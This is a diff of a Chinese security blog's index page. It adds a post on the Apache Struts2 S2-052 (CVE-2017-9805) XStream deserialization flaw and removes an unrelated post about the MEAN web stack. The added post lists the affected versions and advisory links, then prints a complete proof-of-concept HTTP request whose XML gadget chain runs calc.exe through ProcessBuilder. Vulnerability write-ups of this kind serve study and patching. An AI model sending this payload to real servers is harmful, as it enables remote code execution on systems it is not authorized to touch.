@@ -258,6 +258,62 @@
         
           <section id="main" style="float:none;">
   
+    <article id="post-Struts2 远程代码执行漏洞S2-052"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/">Struts2 远程代码执行漏洞S2-052</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2017/09/06/Struts2 远程代码执行漏洞S2-052/" class="article-date">
+	  <time datetime="2017-09-06T15:53:56.000Z" itemprop="datePublished">2017-09-06</time>
+	</a>
+
+      
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Struts2-远程代码执行漏洞S2-052"><a href="#Struts2-远程代码执行漏洞S2-052" class="headerlink" title="Struts2 远程代码执行漏洞S2-052"></a>Struts2 远程代码执行漏洞S2-052</h1><p><a href="http://shackles.top/2017/09/06/S2-052/"> 2017-09-06</a></p>
+<h2 id="Struts2-远程代码执行漏洞-S2-052"><a href="#Struts2-远程代码执行漏洞-S2-052" class="headerlink" title="Struts2 远程代码执行漏洞 : S2-052"></a>Struts2 远程代码执行漏洞 : S2-052</h2><p>Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，可能会遭到远程代码执行攻击。</p>
+<ul>
+<li>前提：启用Strut REST 插件。</li>
+<li>Struts 2.5 – Struts 2.5.12 版本</li>
+<li>官方公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-052</a></li>
+<li>漏洞编号：S2-052</li>
+<li>CVE-2017-9805</li>
+</ul>
+<h3 id="S2-052概述"><a href="#S2-052概述" class="headerlink" title="S2-052概述"></a>S2-052概述</h3><p>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。</p>
+<p>漏洞是由 Semmle 使用其开源分析工具 lgtm 及 QL 语言编写的 Java 反序列威胁查询检测而出的，详情可参考<br><a href="https://lgtm.com/blog/apache_struts_CVE-2017-9805" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2017-9805</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.struts2.rest.handler.AllowedClasses</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.AllowedClassNames</span><br><span class="line"></span><br><span class="line">org.apache.struts2.rest.handler.XStreamPermissionProvider</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /struts2-rest-showcase/orders.xhtml HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</span><br><span class="line">Cookie: JSESSIONID=6FBA41434A908795E708AE545267C797; UM_distinctid=15e36471d10d0-09d67d334fbd0f8-49594234-100200-15e36471d11231; CNZZDATA1670348=cnzz_eid%3D1690420666-1504145890-%26ntime%3D1504329636</span><br><span class="line">Connection: close</span><br><span class="line">If-None-Match: 182927695</span><br><span class="line">Content-Length: 1647</span><br><span class="line"></span><br><span class="line">&lt;map&gt; </span><br><span class="line">&lt;entry&gt; </span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;C:\Windows\System32\calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; </span><br><span class="line">&lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="效果如下："><a href="#效果如下：" class="headerlink" title="效果如下："></a>效果如下：</h3><p><a href="http://osuq6jhys.bkt.clouddn.com/s2-052.png" target="_blank" rel="noopener"><img src="http://osuq6jhys.bkt.clouddn.com/s2-052.png" alt="效果图"></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-CTF-逆向 基础"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -1365,61 +1421,6 @@
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
 
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-MEAN--全栈WEB开发框架"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2016/11/29/MEAN--全栈WEB开发框架/">MEAN--全栈WEB开发框架</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2016/11/29/MEAN--全栈WEB开发框架/" class="article-date">
-	  <time datetime="2016-11-29T15:53:56.000Z" itemprop="datePublished">2016-11-29</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="MEAN–全栈WEB开发框架"><a href="#MEAN–全栈WEB开发框架" class="headerlink" title="MEAN–全栈WEB开发框架"></a>MEAN–全栈WEB开发框架</h1><p><a href="http://shackles.top/2016/12/01/tags-%20%20Web%20%E6%A1%86%E6%9E%B6/"> 2016-12-01</a></p>
-<h1 id="MEAN-Mongode-Express-Angular-Node-js"><a href="#MEAN-Mongode-Express-Angular-Node-js" class="headerlink" title="MEAN Mongode + Express + Angular + Node.js"></a>MEAN Mongode + Express + Angular + Node.js</h1><blockquote>
-<p>##全Javascript的开发架构<strong>MEAN</strong>。<br><a href="https://meanjs.org/img/logo.png" target="_blank" rel="noopener"><img src="https://meanjs.org/img/logo.png" alt="img"></a><br>js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。</p>
-</blockquote>
-<ol>
-<li><strong>(M</strong>)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是使用JS来进行sql查询；<br><a href="http://mean.io/wp-content/themes/twentysixteen-child/images/mongodb.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/mongodb.png" alt="m"></a>m</li>
-<li>(<strong>E</strong>)Express——较好的基于Node的Web开发框架，是一个最小的，灵活的Node.js Web应用程序框架，构建单页和多页，和混合Web应用程序提供了一套强大的功能；</li>
-<li>(<strong>A</strong>)Aagular——JS的前端开发框架，提供了声明式的双向数据绑定；<a href="http://mean.io/wp-content/themes/twentysixteen-child/images/angularjs.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/angularjs.png" alt="A"></a>A</li>
-<li>(<strong>N</strong>)Node——跑在服务器的js，并发 异步 事件驱动，基于V8的运行时环境（JS语言开发），可以构建快速响应、可扩展的网络应用。<br><a href="http://mean.io/wp-content/themes/twentysixteen-child/images/nodejs.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/nodejs.png" alt="n"></a>n</li>
-</ol>
-<p><a href="https://raohuaming.github.io/images/mean-stack.png" target="_blank" rel="noopener"><img src="https://raohuaming.github.io/images/mean-stack.png" alt="img"></a><br><em>1.架构框图</em><br>采用MVC架构。模型-视图-控制器 (MVC)</p>
-<p><a href="http://simage.jdon.com/idea/meanarchitecture.png" target="_blank" rel="noopener"><img src="http://simage.jdon.com/idea/meanarchitecture.png" alt="img"></a><br>可以直接存储JSON格式的mongoDB数据库，</p>
-<h3 id="1-从-LAMP-到-MEAN"><a href="#1-从-LAMP-到-MEAN" class="headerlink" title="1. 从 LAMP 到 MEAN"></a>1. 从 <a href="http://baike.baidu.com/link?url=xxWtinT946K5F6Ur9Vzt0st7GyosP3TlaybV1fNkN7BFlDF9TFN0xaTePZbcMTPQHKL2mC_2w6igSGtTQeqIda" target="_blank" rel="noopener">LAMP</a> 到 MEAN</h3><p>MEAN 不仅仅是一次首字母缩写的简单重新安排与技术升级。将基础平台从操作系统 (Linux) 转变为 JavaScript 运行时 (Node.js) 让操作系统变得独立：Node.js 在 Windows® 与 OS X 上的运行情况和在 Linux 上一样优秀。跨平台强。</p>
-<h3 id="1-1"><a href="#1-1" class="headerlink" title="- 1.1"></a>- 1.1</h3><p>Node.js 同样取代了 LAMP 堆栈中的 Apache。但 Node.js 远远不止是一种简单的 Web 服务器。事实上，用户不会将完成后的应用程序部署到单机的 Web 服务器上；相反，Web 服务器已经包含在应用程序中，并已在 MEAN 堆栈中自动安装。结果，部署过程得到了极大简化，因为所需的 Web 服务器版本已经与余下的运行时依赖关系一起得到了明确定义。</p>
-<h3 id="1-2"><a href="#1-2" class="headerlink" title="- 1.2"></a>- 1.2</h3><p>从传统数据库（如 MySQL）–&gt;非关系数据库 (如NoSQL）–&gt;无架构的、以文档为导向的持久存储（如 MongoDB），这些代表着持久化策略发生了根本性的转变。用户花费在编写 SQL 上的时间将会减少，将会有更多的时间编写 JavaScript 中的映射/化简功能。用户还能省掉大量的转换逻辑，因为 MongoDB 可以在本地运行 JavaScript Object Notation (JSON)。因此，编写 RESTful Web 服务变得前所未有的容易。 从 LAMP 到MEAN的最大转变在于从传统的服务器端页面生成变为客户端 单页面应用程序 (SPA)。借助 Express仍然可以处理服务器端的路由与页面生成，但目前的重点在客户端视图上，而 AngularJS 可以实</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
     </footer>
   </div>
   
